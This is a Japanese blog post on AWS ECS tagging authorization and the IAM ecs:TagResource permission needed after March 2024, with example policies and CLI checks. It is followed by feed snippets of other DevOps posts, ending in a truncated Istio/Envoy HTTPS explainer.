すべてのアカウントでタグ付け認可が有効になり、アカウント単位での設定が不可能になる現時点(2024/03/20)であまり時間がありません。現在タグ付け認可に影響あるAWSアカウントに関しては、Personal Health Dashboadに以下のような通知が来ているはずです。▼ElasticContainerService security notification (クリックで展開)▼English follows Japanese | 英語のメッセージは日本語の後にございますお客様のアカウントにて過去 1 年以内に ecs:TagResource の許可無しに ECS リソースの作成時にタグを付けていることが判明したため、ご連絡差し上げます。Amazon ECS は、2023 年 4 月 18 日にリソース作成のタグ付け認証を導入しました [1]。新規および既存のお客様は、ECS Console または API の ECS アカウント設定ページを使用して、この新機能の使用をオプトインする必要があります。このセキュリティ制御により、ECS リソースの作成時にタグをつけることをユーザーに拒否または許可できます。2024 年 3 月 29 日以降もお客様の IAM プリンシパルが新しく作成された ECS リソースに引き続きタグを適用できるように、IAM ポリシーを更新して ecs:TagResource アクションを明示的に許可することを強くお勧めします。2024 年 2 月 9 日以降、AWS コンソール の ECS アカウント設定ページにて tagResourceAuthorization アカウント設定を明示的に off に設定していないすべてのお客様のアカウントは、自動的にこの設定にオプトインされました。お客様の AWS アカウントは一時的に許可リストに載せているため、2024 年 3 月 29 日まではタグリソース認証の off の動作が継続されます。2024 年 3 月 8 日、現在オプトインしているアカウントが tagResourceAuthorization をオプトアウトする機能を削除し、タグをサポートするすべての ECS リソースの作成に際して ecs:TagResource IAM 権限の使用を強制するようにしました。最終的に 2024 年 3 月 29 日をもってお客様のアカウントを許可リストから削除し、tagResourceAuthorization を有効化します。呼び出し元のプリンシパルの IAM ポリシーに ecs:TagResource アクションを含めずにタグをつけて ECS リソースを作成しようとすると、「AccessDenied」メッセージが表示されます。この変更は CreateCapacityProvider, CreateCluster, CreateService, CreateTaskSet, RegisterContainerInstance, RunTask, StartTask, および RegisterTaskDefinition の API に影響を及ぼします。ecs:TagResource を使用しない拒否レスポンスの例以下は、ecs:CreateCluster アクションを付与している IAM ポリシーの一部です。ecs:TagResource アクションは含まれていません。tagResourceAuthorization アカウント設定がオンの場合、リクエスト例では以下の AccessDenied 例外が返されます。# IAM ポリシー“Statement”: [{“Sid”: “AllowCreateCluster”,“Effect”: “Allow”,“Action”: [“ecs:CreateCluster”],“Resource”: “*”}]# クラスター作成のリクエストaws ecs create-cluster --cluster-name MyCluster --tags key=key1,value=value1# タグ付けの拒否されたレスポンスAn error occurred (AccessDeniedException) when calling the CreateCluster operation:User: is not authorized to perform: ecs:TagResource on resource: cluster/MyCluster because no identity-based policy allows the ecs:TagResource action必要なアクション:IAM プリンシパルが 2024 年 3 月 29 日以降も新しく作成された ECS リソースに引き続きタグを適用できるように、IAM ポリシーに次のステートメントを追加することを強くお勧めします。すべての ECS リソースの作成時にタグ付けを許可以下の説明に従って ecs:TagResource アクションを追加すると、ECS リソースの作成中にタグ付けが可能になります [2]。“Statement”: [{“Sid”: “AllowTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”}]単一の ECS リソースタイプ (ECS クラスタ) の作成時にタグ付けを許可条件ステートメント ecs:CreateAction を使用すると、タグ付けを特定の ECS API に制限できます。以下の例では、ECS CreateCluster API でのみタグ付けへのアクセスを許可します。タグ付きの ECS RunTask API へのリクエストは、拒否判定になります [2]。“Statement”: [{“Sid”: “AllowClusterTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”,“Condition”: {“StringEquals”: {“ecs:CreateAction” : “CreateCluster”}}}]タイムライン:2024 年 2 月 9 日（完了）- タグ付け認証はデフォルトで on になっています。これには、ホワイトリストに登録されているアカウントは含まれません。tagResourceAuthorization アカウント設定の on/off を切り替えることも可能であり、ポリシーへの準拠をテストいただけます。2024 年 3 月 8 日 - タグ付け認証を on にすると、off にすることはできなくなります。この日まではアカウント設定を切り替えることができますので、その間に IAM ポリシーをテストすることをお勧めします。2024 年 3 月 29 日 - すべての AWS アカウントでタグ付け認証が有効になります。アカウントレベルの設定は使用されなくなり、AWS コンソールの ECS アカウント設定ページから削除されます。ご質問やご不明点等ございましたら、AWS サポート [3] までお問い合わせください。[1] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-account-settings.html#tag-resources-setting[2] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/supported-iam-actions-tagging.html[3] https://aws.amazon.com/support---We are contacting you because we identified that your account has tagged ECS resources upon creation, within the past year, without the ecs:TagResource permission. Amazon ECS introduced tagging authorization for resource creation on April 18, 2023 [1]. New and existing customers must opt-in to use this new feature by using the ECS Account Settings page in the ECS Console or API. This security control allows users to deny or allow tagging ECS resources when they are created. We strongly recommend you update your IAM policies to explicitly allow the ecs:TagResource action so that your IAM principals continue applying tags to newly created ECS resources on or after March 29, 2024.From February 9, 2024, all customer accounts which have not explicitly set the tagResourceAuthorization account setting to “off” in the ECS Account Settings page in the AWS Console were automatically opted into the setting. We have temporarily allow-listed your AWS account so you will continue to have the “off” behavior for tagResourceAuthorization until March 29, 2024.On March 8, 2024, we removed the ability for currently opted-in accounts to opt-out of tagging authorization and enforced the creation of all ECS resources that support tags to use the ecs:TagResource IAM permission.Finally on March 29, 2024, we will remove your account from the allow-list and activate tagResourceAuthorization. You will experience an \\"AccessDenied\\" message if you attempt to create tagged ECS resources without including the ecs:TagResource action in the IAM policy of the calling principal. This change will affect the following APIs: CreateCapacityProvider, CreateCluster, CreateService, CreateTaskSet, RegisterContainerInstance, RunTask, StartTask, and RegisterTaskDefinition.Example Deny Response without ecs:TagResourceThe following is part of an IAM policy that is granting the ecs:CreateCluster Action. It does not include the ecs:TagResource Action. When tagResourceAuthorization Account setting is on, the example request would return the AccessDeniedException below.# IAM Policy“Statement”: [{“Sid”: “AllowCreateCluster”,“Effect”: “Allow”,“Action”: [“ecs:CreateCluster”],“Resource”: “*”}]# Create Cluster Requestaws ecs create-cluster --cluster-name MyCluster --tags key=key1,value=value1# Tagging Denied ResponseAn error occurred (AccessDeniedException) when calling the CreateCluster operation:User: is not authorized to perform: ecs:TagResource on resource: cluster/MyCluster because no identity-based policy allows the ecs:TagResource actionRequired Action:To ensure your IAM principals continue applying tags to newly created ECS resources on or after March 29, 2024, we strongly recommend adding the following statement(s) to your IAM policies:Allow Tagging during creation for all ECS ResourcesAdding the ecs:TagResource Action as described below would Allow tagging during ECS resource creation [2].“Statement”: [{“Sid”: “AllowTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”}]Allow Tagging during creation for single ECS Resource Type (ECS Cluster)Using the Conditional statement ecs:CreateAction allow you to limit the tagging to a specific ECS API. The example below grants access to tagging only on the ECS create-cluster API. A request to the ECS API run-task with tags would result in a Deny decision [2].“Statement”: [{“Sid”: “AllowClusterTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”,“Condition”: {“StringEquals”: {“ecs:CreateAction” : “CreateCluster”}}}]Timeline:February 9, 2024 (Completed) - Tagging Authorization is “on” by default. This excludes your account which is allowlisted. The tagResourceAuthorization account setting can be turned on/off to help test your policy compliance.March 8, 2024 - Tagging Authorization can no longer be turned “off” once it is turned “on”. It is recommended that you test your IAM policies before this date while you are able to toggle the account setting.March 29, 2024 - Tagging Authorization will be turned on for all AWS accounts. The account level setting will no longer be used and will be removed from the ECS Account Settings page in the AWS Console.If you have any questions, please contact AWS Support [3].[1] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-account-settings.html#tag-resources-setting[2] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/supported-iam-actions-tagging.html[3] https://aws.amazon.com/support通知が来ているアカウントは29日までに対応する必要があります。確認aws ecs list-account-settings --effective-settings --name tagResourceAuthorization を実行すると以下のような表示になると思います。ここがonであれば、すでにアカウント単位で有効になってるので影響がありません。(ただし、タグ付きのリソースを新規作成する際には権限が足りないとエラーになる可能性はあります)ここがoffになっている場合、タグ付け認可が無効になってるので3月29日以降影響を受ける可能性があります。% aws ecs list-account-settings --effective-settings --name tagResourceAuthorization{    \\"settings\\": [        {            \\"name\\": \\"tagResourceAuthorization\\",            \\"value\\": \\"on\\",            \\"principalArn\\": \\"arn:aws:iam::xxxxxxxxxxxx:root\\"        }    ]}影響がある例ユースケースにもよりますが、タグ付け認可に関連する操作は以下のようなものが考えられるかと思いますインフラ担当者によるECSリソース構築開発担当者(またはCI/CD)によるECSサービスのデプロイ前者に関しては、PowerUser相当の強い権限を付与されていることが多くここが問題になることはほとんどど無いかとは思います。後者の特にCI/CDによるデプロイに問題となることがありえます。一般的に非人間ユーザで目的が明確であれば、最小権限の原則に則り、 ecs:TagResource が付与されていない可能性があります。トライアンドエラーで権限を付与した場合、過去にうまく動いたためそのままの権限で使い続けている可能性もあります。その場合影響がある可能性あります。デプロイ時のタスク定義登録の際、タスク定義内に従来なかったtagsの記述を新規追加した際にResgisterTaskDefinitionでエラーになるという事例を私は経験しました。タスク定義にtagsがないときはタグ付け認可は実行されないのでそのまま成功していたため、ecs:TagResource が必要なことに気づいていませんでした。エラーとしては以下のような記述になるので、タグ付け認可の機能の存在を知っていて冷静に読み解けば、ecs:TagResource が足りていないことに気づけると思います。An error occurred (AccessDeniedException) when calling the RegisterTaskDefinition operation: User: arn:aws:sts::xxxx:assumed-role/deploy-github-actions/GitHubActions is not authorized to perform: ecs:TagResource on resource: arn:aws:ecs:ap-northeast-1:xxxx:task-definition/ecs-service because no identity-based policy allows the ecs:TagResource action対応まずECSサービスを利用しているIAM RoleとIAM Policyを洗い出します。その上でそれらが以下のアクションを許可している場合、ecs:TagResource を追加してあげます。CreateCapacityProviderCreateClusterCreateServiceCreateTaskSetRegisterContainerInstanceRegisterTaskDefinitionRunTaskStartTask私の場合は、ECSサービスデプロイ用のポリシーに以下のStatementを追加しました。それぞれ適切な記述を足していただけたらと思います。この場合タスク定義を登録する際にタグ付け認可を通すような許可を追加しています。        {            \\"Action\\": \\"ecs:TagResource\\",            \\"Condition\\": {                \\"StringEquals\\": {                    \\"ecs:CreateAction\\": \\"RegisterTaskDefinition\\"                }            },            \\"Effect\\": \\"Allow\\",            \\"Resource\\": \\"arn:aws:ecs:ap-northeast-1:xxxxxx:task-definition/yyyyyyyyyyyyyyy:*\\",            \\"Sid\\": \\"RegisterTaskDefinitionWithTag\\"        },まとめタグ付け認可について説明しました。タグ付け認可は2024年3月29日に強制的に全アカウントで有効になります。時間が少ないですが、影響受ける可能性があるかどうかチェックしてハマらないようにしましょう。また、これまでタグ付けしてなかったリソースにタグ付けする際にタグ付け認可に引っかかる可能性があります。デプロイやリソース作成の際にnot authorized to perform: ecs:TagResource と言われたらこの記事を思い出していただけたらと思います。それでは良いECSライフを!関連リソースアカウント設定による Amazon ECS 機能へのアクセス - Amazon Elastic Container Service タグ付け認可リソース作成時にタグ付けするための許可を付与する - Amazon Elastic Container Service","isoDate":"2024-03-20T03:11:51.000Z","dateMiliSeconds":1710904311000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Skaffoldのスゴさを語る！","link":"https://zenn.dev/kojake_300/articles/11945f2047b22b","contentSnippet":"この記事は、2024/3/15に登壇したJagu\'e\'r クラウドネイティブ分科会　俺の考える最強のCI/CDのリマスターになります。 k8sアプリケーション開発の悩み突然ですが皆さん、k8sでアプリを動かす時にこんな悩み、イライラはありませんか？k8sで検証する時には必ず通る道だと思います。効率よく検証するにはどうしたものか、、Skaffoldはそんな悩みを解決してくれます\uD83D\uDE04 Skaffoldとは？ 概要Skaffold[1]は、コンテナベース及びKubernetesアプリケーションの継続的開発(Continuous Development = CD)を容易...","isoDate":"2024-03-18T11:24:43.000Z","dateMiliSeconds":1710761083000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Skaffoldを用いたGKEアプリケーションの CD（Continuous Development）","link":"https://speakerdeck.com/kojake_300/skaffoldwoyong-itagkeapurikesiyonno-cd-continuous-development","contentSnippet":"","isoDate":"2024-03-17T04:00:00.000Z","dateMiliSeconds":1710648000000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Tagpr で tag trigger の workflow が実行されなくてハマった話","link":"https://blog.1q77.com/2024/03/tagpr/","contentSnippet":"最近 tagpr という便利ツールの存在を知って試していたのですが、使い方が悪くてハマったのでメモ。tagpr とは作者さまの記事を参照ください。リリース用のpull requestを自動作成し、マージされたら自動でタグを打つtagpr","isoDate":"2024-03-15T00:00:00.000Z","dateMiliSeconds":1710460800000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Helm chart を GitHub Container Registry に host する","link":"https://blog.1q77.com/2024/03/helm-push-to-ghcr/","contentSnippet":"背景最近は書いたアプリを Kubernetes に deploy することも多い。その際に helm で簡単に deploy できるようになっていると便利ということで Helm chart を Git に入れておいても良いのだけれども、せっかくなら直接インストールできるようにしてしまいたい。そんな場合に使えるのが OCI Registry。","isoDate":"2024-03-14T15:13:39.000Z","dateMiliSeconds":1710429219000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Google Cloud Managed Service for Prometheusでprismaメトリクスを可視化してみた","link":"https://speakerdeck.com/kojake_300/google-cloud-managed-service-for-prometheusteprismametorikusuwoke-shi-hua-sitemita","contentSnippet":"","isoDate":"2024-02-29T05:00:00.000Z","dateMiliSeconds":1709182800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Reckoner の Scala プロジェクトにおける オブザーバビリティの取り組み / Observability Initiatives in Reckoner\'s Scala Project","link":"https://speakerdeck.com/nomadblacky/reckoner-no-scala-puroziekutoniokeru-obuzababiriteinoqu-rizu-mi","contentSnippet":"2024/02/27 Scalaわいわい勉強会 #2\\rhttps://scala-tokyo.connpass.com/event/307069/","isoDate":"2024-02-27T05:00:00.000Z","dateMiliSeconds":1709010000000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"Azure Container Apps Jobs を Self-hosted GitHub Actions Runner として使う","link":"https://blog.1q77.com/2024/02/container-apps-jobs-self-hosted-github-actions-runner/","contentSnippet":"GitHub Actions の Self-hosted Runner を安く用意する方法を探していたところ、Azure の Container Apps Jobs というのが便利に使えるらしいというのを見つけたので試してみる。チュートリアル:Azure Container Apps ジョブを使用してセルフホスト型 CI/CD ランナーとエージェントをデプロイするをなぞるだけです。","isoDate":"2024-02-23T10:05:41.000Z","dateMiliSeconds":1708682741000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"アーキテクチャから学ぶKubernetesの全体像","link":"https://speakerdeck.com/bells17/akitekutiyakaraxue-hukubernetesnoquan-ti-xiang","contentSnippet":"Developers Summit（デブサミ）2024で登壇したセッションの資料です。\\r\\r- https://event.shoeisha.jp/devsumi/20240215\\r- https://event.shoeisha.jp/devsumi/20240215/session/4777\\r\\rセッション解説記事:\\rhttps://codezine.jp/article/detail/19131","isoDate":"2024-02-15T05:00:00.000Z","dateMiliSeconds":1707973200000,"authorName":"bells17","authorId":"bells17"},{"title":"個人開発でWebアプリの開発とデプロイの流れ","link":"https://kechigon.hatenablog.com/entry/2024/02/13/125853","contentSnippet":"個人でWebサービスを開発したいけど、どのような流れで作っていけばいいのかわからない方向けです。個人開発でWebアプリを開発、デプロイをしたのでその流れを共有したいと思います。作ったもの麻雀戦績管理アプリ名付けて「PungPals」。雀荘などのオフラインでの対戦結果を残し、個人成績やランキングを確認できます。pungpals-service-xstpolfd4q-an.a.run.app開発とデプロイの流れ1.要件定義、設計実装がスムーズに進むために、しっかりとしておきましょう。以前記事を書いたので、参考にしてください。kechigon.hatenablog.com2.技術選定今回作ったアプリケーションはDjangoで開発し、Cloud Runにデプロイしています。選定理由は、Django: 経験があるから。Cloud Run: Djangoアプリのデプロイ方法の公式ドキュメントがあった(後ほど説明します)、マネージドな部分とカスタムできる部分のバランスがちょうどよかったから。でした。以下これらの技術を使って、開発デプロイまでの流れを説明していきます。3.Djangoを使ってアプリケーションを作成Djangoにはチュートリアルがあり、はじめての Django アプリ作成、その 1 | Django ドキュメント | Djangoはじめての Django アプリ作成、その2 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 3 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 4 | Django ドキュメント | Djangoを読めば開発方法がわかると思います。環境構築をし、実装し、ローカルで動作確認をしながら開発していきます。4.Cloud run へのデプロイDjangoアプリのCloud runへのデプロイ方法は公式ドキュメントにまとめられているので、これを見ながら進めます。cloud.google.comDjangoアプリケーションを環境に合わせて設定した後コンテナ化し、Cloud Runに載せます。それに伴い、Cloud SQL(データベース)、Secret Manager(シークレット管理)、Cloud Storage(静的アセットの保存など)、Cloud Build(CI/CD)、Artifact Registry(コンテナレジストリ)の作成、設定も行います。ドキュメントではGCRを使っていますが、現在非推奨なので、Artifact Registryをコンテナレジストリとして使用します。cloud.google.comオプションですが、GCPへのリソースの作成はTerraformを利用すると、構成管理ができ便利です。作成するインフラの図以上のことを行った後のGitHubリポジトリPungPalsのコードは公開しているので、参考にしていただければと思います。github.comこれから今後は、運用面の課題解決や集客などを行っていく予定なので、ブログにしていくつもりです！","isoDate":"2024-02-13T03:58:53.000Z","dateMiliSeconds":1707796733000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"フロントエンドで収集するべきテレメトリは何か","link":"https://zenn.dev/kimitsu/articles/frontend-and-telemetry","contentSnippet":"先日『フロントエンド監視の全体像と実現方法』という記事を投稿しましたが、その中でテレメトリについては触れませんでした（※本記事は上記記事の内容を知らなくても読み進められるようになっています）。というのは、テレメトリは可観測性を実現するための重要な概念ではあるものの、テレメトリを軸に監視を考えるのは手段の目的化になってしまうと考えているからです。重要なのはサービスにとって何を観測するべきかを考えることであり、テレメトリはそれを設計や実装に落とし込む際に現れるものです。一方で監視に対する理解を深める上では、テレメトリを軸に考えることも重要でしょう。そこで本記事ではフロントエンド監視に...","isoDate":"2024-02-11T01:40:25.000Z","dateMiliSeconds":1707615625000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"フロントエンド監視の全体像と実現方法","link":"https://zenn.dev/kimitsu/articles/frontend-monitoring","contentSnippet":"必要性フロントエンドの監視はバックエンドやインフラのそれらと比べ、優先度が低くなりがちです。バックエンドやインフラでの障害はサービス継続に直結するため、これは当然と言えば当然なのですが、別の理由もあると考えています。それは計算リソースをサービス提供側が管理していないことです。例えばアプリケーションがインフラとして AWS を利用しているなら、AWS のリソースを管理するのはサービス提供側です。これは AWS 以外のクラウドサービスプロバイダやオンプレであっても同様です。一方でフロントエンドはエンドユーザのブラウザ上で動作し、これを管理しているのはエンドユーザです。フロン...","isoDate":"2024-02-09T09:46:56.000Z","dateMiliSeconds":1707472016000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"安全な Kubernetes 環境を目指して","link":"https://speakerdeck.com/kyohmizu/an-quan-na-kubernetes-huan-jing-womu-zhi-site","contentSnippet":"Kubernetes Novice Tokyo #30 の登壇資料です。2024/02/08\\rhttps://k8s-novice-jp.connpass.com/event/300441/","isoDate":"2024-02-08T05:00:00.000Z","dateMiliSeconds":1707368400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"YugabyteDB ManagedのAlways Free枠を試そう","link":"https://zenn.dev/nnaka2992/articles/play_with_yugabytedb_managed_sandbox","contentSnippet":"YugabyteDB Managedにフリートライアルがあるのは知っていたのですが、期間が限られたものしか無いと思っていました。YugabyteDBについて調べごとをしていたら機能制限はあるもののSandboxクラスターというクレジットカード登録すら不要でAlways Freeな利用枠があることを知りました。いままでローカルでYugabyteDBを建てたりminikube上で遊んでいたのですが、簡単な検証であればSandboxクラスターで十分です。この記事ではそんなYugabyteDB ManagedのSandboxクラスターを紹介します。 Sandbox Clusterの制限...","isoDate":"2024-02-04T15:02:28.000Z","dateMiliSeconds":1707058948000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"renovate で CircleCI の terraform_version を更新する","link":"https://blog.1q77.com/2024/02/update-terraform-version-in-circleci-with-renovate/","contentSnippet":"課題Circle CI の terraform Orb でterraform の version を指定するには次のようにしますが、この terraform_version の値に変数を使うことが出来ず、tf ファイルや .tool-versions から読み出した値を使うことが出来ませんでした。","isoDate":"2024-02-04T10:37:36.000Z","dateMiliSeconds":1707043056000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Controllerを作ってみよう~ Kubernetes Controllerハンズオン ~","link":"https://speakerdeck.com/bells17/controllerwozuo-tutemiyou-kubernetes-controllerhansuon","contentSnippet":"イベントURL: https://k8s-novice-jp.connpass.com/event/300442/\\r参考リポジトリ: https://github.com/bells17/k8s-controller-example\\r\\rその他リンク:\\r\\rhttps://github.com/kubernetes/sample-controller\\rhttps://github.com/kubernetes/kubernetes/blob/v1.29.1/pkg/controller/clusterroleaggregation/clusterroleaggregation_controller.go\\rhttps://github.com/kubernetes/client-go/tree/v12.0.0\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/reflector.go\\rhttps://github.com/kubernetes/client-go/tree/v12.0.0/informers\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/store.go\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/delta_fifo.go\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/util/workqueue/rate_limiting_queue.go","isoDate":"2024-01-30T05:00:00.000Z","dateMiliSeconds":1706590800000,"authorName":"bells17","authorId":"bells17"},{"title":"Mac に Homebrew で docker pluings をインストールする","link":"https://blog.1q77.com/2024/01/install-docker-plugins-on-mac/","contentSnippet":"Homebrew で plugin をインストールDocker Desktop for Mac であれば何もしなくても docker compose コマンドは使えるようになっているのですが、Lima で docker を使っている場合などで Homebrew で docker をインストールしていると docker compose や docker buildx を使えるようにするためには追加でのインストールが必要でした。","isoDate":"2024-01-26T12:36:56.000Z","dateMiliSeconds":1706272616000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"限定公開のGKE上でセキュアなGithub Actionsのrunnerを構築","link":"https://zenn.dev/kojake_300/articles/7be501d3fc4e72","contentSnippet":"モチベーションGithub Actionsのセルフホストランナーでは、long pollingによりrunner側でingressのfirewallを設定せずにrunnerをデプロイ出来るというのを最近知ったので、GKEで検証していこうと思います。 構成ざっくりですがこんな感じ。GKEは限定公開のクラスタとして構築し、踏み台サーバからGKEにリクエストを送ります。Github Actionsとの通信のためにVPCにはCloud NATをアタッチします。 前提条件terraformで構築するため、予めインストールしておくこと。(検証はv1.0.0) 構築手順...","isoDate":"2024-01-24T11:08:37.000Z","dateMiliSeconds":1706094517000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"K8sGPT: Prometheus Analyzers","link":"https://zenn.dev/tozastation/articles/71015cc5b95b4e","contentSnippet":"v0.3.26 からPrometheus の Analyzer がリリースされましたデモ映像はこちらhttps://github.com/k8sgpt-ai/k8sgpt/pull/855本PR作成者の Daniel Clark さんは Google の方 (2024/01/18時点)で，prometheus-engine (Cloud Managed Service for Prometheus (GMP)) に多くのコントリビューションをされています． 先にまとめPrometheus Analyzer には現在二つの機能が含まれるConfig Analyzer ...","isoDate":"2024-01-23T03:00:00.000Z","dateMiliSeconds":1705978800000,"authorName":"tozastation","authorId":"tozastation"},{"title":"openssl s_client で SMTP 認証","link":"https://blog.1q77.com/2024/01/smtp-auth-plain-with-openssl-command/","contentSnippet":"Amazon SES での SMTP 認証情報の確認をしたいAmazon SES で SMTP を使ってメール送信したい場合、IAM User の credentials をちょいと加工してやる必要があります。Amazon SES SMTP 認証情報を取得","isoDate":"2024-01-23T02:44:23.000Z","dateMiliSeconds":1705977863000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"【Istio⛵️】Istioによって抽象化されるEnvoyのHTTPSリクエスト処理の仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/01/16/013404","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのサイドカーメッシュを題材にしたEnvoyの設定の抽象化について様々なサービスメッシュツール (特に、Istio、Consul、Ciliumなど) でも流用できるEnvoyの知識についてこの記事から得られる知識01. はじめに02. 様々なリソースによるEnvoy設定の抽象化サービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS03. istio-proxyコンテナによるHTTPS処理Istioコントロールプレーンの仕組みサービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS04. EnvoyによるHTTPS処理Envoyの設定の種類フィルターフィルターの一覧フィルターチェーンの仕組み05. リソースの設定からEnvoy設定への翻訳各リソースとEnvoyの設定の関係一覧サービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるマイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるサービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめる06. 翻訳されたEnvoy設定値を見てみるEnvoyの現在の設定を出力するリスナーを出力するルートを出力するクラスターを出力するエンドポイントを出力する証明書を出力するサービスメッシュ外からのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナマイクロサービス間のHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナサービスメッシュ外へのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナ07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、俺 (REMIX) feat. Istioニキ a.k.a. いすてぃ男です。Istioは、Envoyを使用したサービスメッシュを実装します。IstioがKubernetesリソースやIstioカスタムリソースに基づいてEnvoyの設定を抽象化してくれるため、開発者はEnvoyをより簡単に設定できます。Envoyの設定の抽象化は、Envoyを使用したサービスメッシュ (例：Istioサイドカーメッシュ/アンビエントメッシュ、Consul、Istioから得られた学びを土台に登場したCiliumサイドカーフリーメッシュなど) に共通しています。つまり、次々に登場するEnvoyによるサービスメッシュツールに振り回されないようにするためには、ツールがどのようにEnvoyを抽象化するのかを理解しておく必要があります。そこで今回は、IstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのかを解説します。また、抽象化されたEnvoyがHTTPSリクエストを処理する仕組みも一緒に解説します。これらの知識は、様々なサービスメッシュツールで流用できるはずです。それでは、もりもり布教していきます\uD83D\uDE1702. 様々なリソースによるEnvoy設定の抽象化まずは、どのようなリソースがHTTPSリクエストの処理に関係しているのかを、HTTPSリクエストの方向に分けて解説していきます。istio-proxyコンテナやEnvoyについては、次章以降で解説します。サービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| Gateway    Gateway([⛵️ Gateway]) -.-> VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。もちろん、クラスター外からIstio IngressGateway PodにHTTPリクエストを送信するために、Service (例：NodePort Service) が必要です。Istio IngressGateway Podは、宛先Podとの間で相互TLS認証を実施します。Istio IngressGateway Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineeringマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、宛先Podとの間で相互TLS認証を実施します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blog▶︎ サービスメッシュ内のPod間通信にkube-proxyは必要なのかistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます (本記事3章参照) 。これにより、送信元Podから宛先Podに直接通信できるようになります。Tracing network path in Istio. Istio is among the most widely used… | by Bikram Gupta | Mediumサービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。複数のVirtualServiceとDestinationが登場するため、これらには便宜上 X と Y をつけています。flowchart TD    送信元 -.->|HTTPS| VirtualServiceX    VirtualServiceX([⛵️ VirtualService X]) -.-> DestinationRuleX    DestinationRuleX([⛵️ DestinationRule X]) -.-> Service    Service([☸️ Service]) -.-> 